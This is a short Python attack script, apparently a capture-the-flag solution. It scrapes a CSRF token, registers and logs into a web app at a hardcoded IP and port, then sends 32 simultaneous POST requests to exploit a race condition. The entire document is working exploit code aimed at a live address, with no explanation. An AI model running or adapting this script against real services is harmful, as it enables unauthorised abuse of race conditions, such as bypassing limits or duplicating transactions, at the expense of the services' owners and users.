from requests import session
from lxml.html import *
import random, string

def rnd(N):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

def gettoken(r):
    return r.xpath('//input[@name="_token"]')[0].get('value') 

s = session()

url = "http://104.248.42.88:4448"

r = fromstring(s.get(url+'/register').text)
token = gettoken(r)

rand = rnd(10)
print (rand)
r = s.post(url+'/register', data = {
        '_token': token,
        'name': rand,
        'password': rand,
    }).text
r = fromstring(r)
token = gettoken(r)

r = s.post(url+'/login', data = {
        '_token': token,
        'name': rand,
        'password': rand,
    }).text

r = fromstring(r)
token = gettoken(r)

from time import sleep
def click(i):
    r = s.post(url, data = {'_token':token})
    print (i, r.text)

from multiprocessing.dummy import Pool as ThreadPool
pool = ThreadPool(32)
result = pool.map_async( click, range(32) ).get(0xff)
